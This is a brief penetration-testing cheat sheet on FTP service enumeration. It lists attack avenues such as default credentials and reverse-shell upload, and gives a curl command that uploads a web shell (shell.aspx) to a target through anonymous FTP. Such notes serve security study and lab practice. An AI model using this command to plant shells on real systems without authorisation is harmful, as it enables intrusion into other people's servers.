# Common Service Enumeration

## FTP (21)
- Commom Credentials
- File upload
- File download
- Upload Reverse Shell
- Directory Traversal

## Upload a file using curl with anonymous FTP
```
curl -T shell.aspx ftp://<ip address>/shell.aspx --user anonymous:guest
```